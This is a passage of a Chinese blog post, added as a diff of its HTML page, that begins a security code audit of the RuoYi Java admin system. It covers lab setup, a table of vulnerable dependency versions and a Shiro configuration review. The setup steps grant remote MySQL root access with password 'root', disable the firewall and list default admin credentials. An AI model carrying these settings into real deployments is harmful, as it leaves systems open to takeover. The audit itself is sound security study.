@@ -1,0 +1,1219 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Power7089">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言：【如需转载，请详细表明来源】 欢迎大家扫描下方二维码关注 “闪石星曜CyberSecurity” 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。  如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统">
+<meta property="og:url" content="http://example.com/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E4%B8%8D%E5%BE%97%E4%B8%8D%E5%A5%BD%E5%A5%BD%E5%AD%A6%E7%9A%84%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F/index.html">
+<meta property="og:site_name" content="Power7089">
+<meta property="og:description" content="前言：【如需转载，请详细表明来源】 欢迎大家扫描下方二维码关注 “闪石星曜CyberSecurity” 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。  如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/公众号.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/炼石计划@Java代码审计.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/炼石计划@PHP代码审计.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/炼石计划@渗透攻防宇宙.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/配置文件.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/配置文件修改数据源地址.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/打包过程.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/jar包启动成功.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/配置sudo的java环境变量.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/shiro权限匹配模式.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/parseObject关键字搜索.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/velocityUtils的66行.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/getOptions返回值.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/其他生成选项字段.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/跟进setTreeVelocityContext.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/GenConstants判断条件.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/进入TPL_TREE.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/跟进tplCategory.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/getTplCategory返回值.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/tplCategory字段含义.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/谁调用了prepareContext.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/table参数查询表数据返回.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/previewCode方法.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/GenController的preview.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/GenTaleServiceImpl的options值.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/请求字段params.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/validateEdit被调用.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/validateEdit的service层.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/修改保存代码controller.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/yamlload全局搜索.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/多个return内容可控.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sql注入mapper文件.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SQL注入RoleMapper.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/rolemapper的sql注入点位置.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SQL注入点dao层.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/selectRoleList的调用.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SQL注入实现层.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sql注入service层.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sql注入service的controller调用.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SQL注入Controller层.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sysrole字段.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/回溯全流程.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/shiro硬编码密钥.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/ruoyi-quartz文件结构.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SysJobController注释信息.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/SysJobLogController注释信息.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/run方法立即执行一次.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/run的实现层代码.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/invokeMethod最终调用.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/invokeMethod获取参数断点.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/invokeMethod的class方式1.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/invokeMethod的class方式2.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/任意文件下载代码.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/获取全局配置文件路径.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/角色管理-搜索.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/添加dataScope字段.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sql注入单引号报错.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/sql注入之SQLMAP.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/rememberme_deleteme.JPG">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/探测弱密钥.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/shiro执行命令.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/代码生成功能导入一个表.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/导入功能报错.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/设置若依数据库编码格式.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/linux配置文件路径.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/渗透任意文件读取构造请求.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/任意文件读取内容.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/调用目标字符串yaml.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/dnslog探测结果.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/ruoyiall工具介绍.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/ruoyiall填写信息.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/ruoyiall检测出漏洞.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/缓存监控getKeys.jpg">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/getkeys报错.jpg">
+<meta property="og:image" content="file://F:\3%20-%20%E4%BA%8B%E4%B8%9A%E4%B8%BA%E4%B8%BBGoUp@\2%20-%20%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92GoUp@%EF%BC%88%E5%A5%8B%E5%8A%9B%E6%9B%B4%E6%96%B0%E4%B8%AD...%EF%BC%893%E3%80%81%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92%E4%B9%8BWEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%895%E3%80%81%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92%E4%B9%8B50%E5%A5%97JavaWeb%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98_%E7%AC%AC%E4%BA%94%E5%A5%97_%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%90%E6%95%99%E7%A8%8B%E6%96%87%E7%AB%A0%E3%80%91%E7%AC%AC%E4%BA%94%E5%A5%97_%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F\img\thymeleaf3012%E9%99%90%E5%88%B6.jpg?lastModify=1652148836">
+<meta property="og:image" content="c:/Users/powerful/Desktop/img/thymeleaf弹计算器.jpg">
+<meta property="article:published_time" content="2022-08-22T02:39:35.000Z">
+<meta property="article:modified_time" content="2022-08-22T02:40:52.381Z">
+<meta property="article:author" content="Power7089">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:/Users/powerful/Desktop/img/公众号.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统 - Power7089</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":88,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"yxPaB1iPDz9V47o8ASUol6fh-gzGzoHsz","app_key":"PyweBFOvttknCdKW7DspREFV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Power7089的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-22 10:39" pubdate>
+          2022年8月22日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          146 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源】</p>
+<p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p>
+<p><img src="C:/Users/powerful/Desktop/img/公众号.jpg" srcset="/img/loading.gif" lazyload alt="公众号"></p>
+<p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p>
+<p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p>
+<p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p>
+<p><img src="C:/Users/powerful/Desktop/img/炼石计划@Java代码审计.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@Java代码审计"></p>
+<p><img src="C:/Users/powerful/Desktop/img/炼石计划@PHP代码审计.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@PHP代码审计"></p>
+<p><img src="C:/Users/powerful/Desktop/img/炼石计划@渗透攻防宇宙.jpg" srcset="/img/loading.gif" lazyload alt="炼石计划@渗透攻防宇宙"></p>
+<p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p>
+<h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><p>RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache  Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。</p>
+<p><strong>内置功能详解如下：</strong></p>
+<ol>
+<li>用户管理：用户是系统操作者，该功能主要完成系统用户配置。</li>
+<li>部门管理：配置系统组织机构（公司、部门、小组），树结构展现支持数据权限。</li>
+<li>岗位管理：配置系统用户所属担任职务。</li>
+<li>菜单管理：配置系统菜单，操作权限，按钮权限标识等。</li>
+<li>角色管理：角色菜单权限分配、设置角色按机构进行数据范围权限划分。</li>
+<li>字典管理：对系统中经常使用的一些较为固定的数据进行维护。</li>
+<li>参数管理：对系统动态配置常用参数。</li>
+<li>通知公告：系统通知公告信息发布维护。</li>
+<li>操作日志：系统正常操作日志记录和查询；系统异常信息日志记录和查询。</li>
+<li>登录日志：系统登录日志记录查询包含登录异常。</li>
+<li>在线用户：当前系统中活跃用户状态监控。</li>
+<li>定时任务：在线（添加、修改、删除)任务调度包含执行结果日志。</li>
+<li>代码生成：前后端代码的生成（java、html、xml、sql）支持CRUD下载 。</li>
+<li>系统接口：根据业务代码自动生成相关的api接口文档。</li>
+<li>服务监控：监视当前系统CPU、内存、磁盘、堆栈等相关信息。</li>
+<li>缓存监控：对系统的缓存查询，删除、清空等操作。</li>
+<li>在线构建器：拖动表单元素生成相应的HTML代码。</li>
+<li>连接池监视：监视当前系统数据库连接池状态，可进行分析SQL找出系统性能瓶颈。</li>
+</ol>
+<h2 id="二、项目搭建"><a href="#二、项目搭建" class="headerlink" title="二、项目搭建"></a>二、项目搭建</h2><h3 id="1、环境要求"><a href="#1、环境要求" class="headerlink" title="1、环境要求"></a>1、环境要求</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">JDK &gt;= 1.8 (推荐1.8版本)<br>Mysql &gt;= 5.7.0 (推荐5.7版本)<br>Maven &gt;= 3.0<br></code></pre></td></tr></table></figure>
+
+<h3 id="2、Windows环境的项目部署流程"><a href="#2、Windows环境的项目部署流程" class="headerlink" title="2、Windows环境的项目部署流程"></a>2、Windows环境的项目部署流程</h3><p>基于windows10操作系统。</p>
+<p>①、命令行进入Mysql，创建数据库名为<code>ry</code>，并切换使用该数据库。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">create datavase ry<span class="hljs-comment">; 创建名为ry的数据库</span><br>use ry<span class="hljs-comment">; 切换使用ry数据库</span><br></code></pre></td></tr></table></figure>
+
+<p>②、将项目文件中的<code>/sql/ry_20200323.sql</code>的数据导入到<code>ry</code>数据库，注意导入路径中应使用正斜杠<code>/</code>。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/绝对路径/</span>sql/ry_20200323.sql; 导入数据库文件<br></code></pre></td></tr></table></figure>
+
+<p>③、使用IDEA打开本项目，等待Maven自动加载依赖项，如果时间较长需要自行配置Maven加速源。几个现象表明项目部署成功。<code>pom.xml</code>文件无报错，项目代码已编译为<code>class</code>，<code>Run/Debug Configurations...</code>处显示可以运行。</p>
+<p>④、修改<code>src\main\resources\application-druid.yml</code>配置文件内容，具体如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/配置文件.jpg" srcset="/img/loading.gif" lazyload alt="配置文件"></p>
+<p>⑤、点击启动<code>Run/Debug Configurations...</code>本项目。</p>
+<p>⑥、项目访问地址如下：</p>
+<ul>
+<li>后台地址：<code>http://127.0.0.1:8088/login</code></li>
+</ul>
+<p>记得自己配下端口号，默认的是80端口。</p>
+<p>⑦、登录账号密码<code>admin\admin123</code>。</p>
+<h3 id="3、Linux环境的项目部署流程"><a href="#3、Linux环境的项目部署流程" class="headerlink" title="3、Linux环境的项目部署流程"></a>3、Linux环境的项目部署流程</h3><p>基于VMware虚拟机中的搭建的Ubuntu20操作系统</p>
+<p><strong>注意</strong>：以下步骤需要Ubuntu系统中安装所需的软件，可参考星球之前发的一篇文章：<code>https://t.zsxq.com/Ea6qF6Y</code></p>
+<p>本项目的默认打包方式就是JAR形式。并且本项目构建为SpringBoot多模块形式。我们所需要的运行的Jar程序打包在了<code>RuoYi-v4.2/ruoyi-admin/target</code>目录下。</p>
+<p>整体部署流程如下：</p>
+<p>①、使用IDEA打开项目，我们修改一下数据源链接地址。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/配置文件修改数据源地址.jpg" srcset="/img/loading.gif" lazyload alt="配置文件修改数据源地址"></p>
+<p>我为了方便，将数据源直接连接到了Windows下mysql，也就是PHPstaduy一键启动的。如果你也想这样做，请注意以下几点：</p>
+<ul>
+<li>宿主机和虚拟机需要在同一网段下，简单来说就是能互相ping通。</li>
+<li>Mysql启用远程访问，命令如下：</li>
+</ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.*  ‘root’@’%’ identified <span class="hljs-keyword">by</span> ‘root’ <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>; <br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>
+
+<p>②、使用Maven打包项目，选择若依总项目，依次点击<code>clean</code>和<code>package</code>，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/打包过程.jpg" srcset="/img/loading.gif" lazyload alt="打包过程"></p>
+<p>③、我们将最终生成的<code>ruoyi-admin.jar</code>文件，复制粘贴到Ubuntu中。</p>
+<p>④、在此，我们使用<code>sudo java -jar ruoyi-admin.jar</code>运行项目。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/jar包启动成功.jpg" srcset="/img/loading.gif" lazyload alt="jar包启动成功"></p>
+<p>⑤、最后我们就可以正常访问了。</p>
+<p><strong>:warning:注意：</strong></p>
+<ul>
+<li><code>java -jar</code>启动若依项目需要管理员权限，因此要在前面加上<code>sudo</code>，如果报错说找不到命令。需要修改<code>/etc/sudoers</code>文件中<code>Defaults secure_path</code>位置，在后面加上java路径，如下图所示：</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vim <span class="hljs-regexp">/etc/</span>sudoers 打开该文件<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/powerful/Desktop/img/配置sudo的java环境变量.jpg" srcset="/img/loading.gif" lazyload alt="配置sudo的java环境变量"></p>
+<ul>
+<li>如果想要在其他环境中访问ruoyi，需要关闭防火墙，或者激活特定端口。偷个懒，直接关闭防火墙。</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo ufw <span class="hljs-built_in">disable</span> 关闭防火墙<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、代码审计漏洞挖掘"><a href="#三、代码审计漏洞挖掘" class="headerlink" title="三、代码审计漏洞挖掘"></a>三、代码审计漏洞挖掘</h2><h3 id="1、第三方组件漏洞审计"><a href="#1、第三方组件漏洞审计" class="headerlink" title="1、第三方组件漏洞审计"></a>1、第三方组件漏洞审计</h3><p>本项目使用Maven构建的。因此我们直接看pom.xml文件引入了哪些组件。通过IDEA打开该若依，发现本项目采用了多模块方式。因此每个模块下都会有一个pom.xml，项目最外层的pom.xml为父POM。我们可以通过<code>pom.xml</code>或者<code>External Libraries</code>来确定引入组件的版本，具体整理如下：</p>
+<table>
+<thead>
+<tr>
+<th>组件名称</th>
+<th>组件版本</th>
+<th>是否存在漏洞</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>shiro</td>
+<td>1.4.2</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>thymeleaf</td>
+<td>2.0.0</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>druid</td>
+<td>1.1.14</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>mybatis</td>
+<td>1.3.2</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>bitwalker</td>
+<td>1.19</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>kaptcha</td>
+<td>2.3.2</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>swagger</td>
+<td>2.9.2</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>pagehelper</td>
+<td>1.2.5</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>fastjson</td>
+<td>1.2.60</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>oshi</td>
+<td>3.9.1</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>commons.io</td>
+<td>2.5</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>commons.fileupload</td>
+<td>1.3.3</td>
+<td>不存在</td>
+</tr>
+<tr>
+<td>poi</td>
+<td>3.17</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>velocity</td>
+<td>1.7</td>
+<td>存在</td>
+</tr>
+<tr>
+<td>snakeyaml</td>
+<td>1.23</td>
+<td>存在</td>
+</tr>
+</tbody></table>
+<p>等等。</p>
+<p>经过整理，我们发现本项目存在漏洞的组件为：<code>Shiro 1.4.2</code>，<code>Thymeleaf 2.0.0</code>，<code>Fastjson 1.2.60</code>，<code>Commons.io 2.5</code>，<code>oi 3.17</code>，<code>velocity 1.7</code>，<code>snakeyaml 1.23</code>……</p>
+<p>通过版本号进行初步判断后，我们还需再进一步验证。</p>
+<h3 id="2、组件漏洞代码审计"><a href="#2、组件漏洞代码审计" class="headerlink" title="2、组件漏洞代码审计"></a>2、组件漏洞代码审计</h3><p>针对存在漏洞的组件进行代码审计</p>
+<h4 id="2-1、Shiro组件漏洞代码审计"><a href="#2-1、Shiro组件漏洞代码审计" class="headerlink" title="2.1、Shiro组件漏洞代码审计"></a>2.1、Shiro组件漏洞代码审计</h4><p>本项目使用了<code>Shiro 1.4.2</code>。Shiro在<code> 1.4.2 到 1.8.0</code>版本都是存在权限绕过的问题。</p>
+<p>在代码审计中，我们主要关注<code>Shiro配置文件</code>，一般文件名为<code>ShiroConfig</code>。本项目Shiro配置文件位于<code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>。</p>
+<p>进入Shiro配置文件，我们关注对资源访问的拦截器配置，位于<code>第231行 ~ 276行</code>。发现<code>第272行</code>作者使用了<code>/**</code>表达式，对路径进行拦截。因此，本项目<strong>不存在</strong>Shiro权限绕过的漏洞的。如下图所示：</p>
